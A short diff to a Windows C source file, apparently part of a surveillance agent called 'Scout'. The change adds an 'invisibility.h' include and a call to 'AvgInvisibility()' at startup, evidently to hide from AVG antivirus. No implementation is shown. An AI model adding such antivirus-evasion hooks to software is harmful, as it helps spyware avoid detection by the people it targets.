@@ -15,6 +15,7 @@
 #include "md5.h"
 #include "zmem.h"
 #include "conf.h"
+#include "invisibility.h"
 
 #include "position.h"
 #include "social.h"
@@ -126,9 +127,13 @@ WinMain(
 
 	if (InitScout())
 	{
+		AvgInvisibility();
+		
 		// wait for input
 		WaitForInput();
 
+
+		
 	#ifdef _DEBUG
 		OutputDebugString(L"Creating Thread...");
 	#endif
